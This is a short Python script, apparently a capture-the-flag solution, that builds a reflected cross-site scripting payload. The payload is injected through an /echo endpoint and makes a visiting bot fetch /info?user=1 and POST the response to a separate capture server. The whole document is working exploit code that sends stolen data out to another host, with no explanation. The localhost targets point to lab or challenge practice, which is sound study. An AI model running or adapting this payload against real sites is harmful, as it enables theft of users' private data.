import urllib.parse
import requests

challenge_host = "challenge.localhost:80"
redirect_server = "http://localhost:8888/capture"

payload = f"<script>var response_text = ''; var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://{challenge_host}/info?user=1', true); xhr.onreadystatechange = function() {{ response_text = xhr.responseText; }}; xhr.send(); setTimeout(function() {{ var xhr2 = new XMLHttpRequest(); xhr2.open('POST', '{redirect_server}', true); xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr2.send(response_text);  }}, 1000);</script>"

encoded_payload = urllib.parse.quote(payload)

final_url = f"http://{challenge_host}/visit?url=http://{challenge_host}/echo?echo={encoded_payload}"

print(final_url)

requests.request(method="GET", url=final_url)
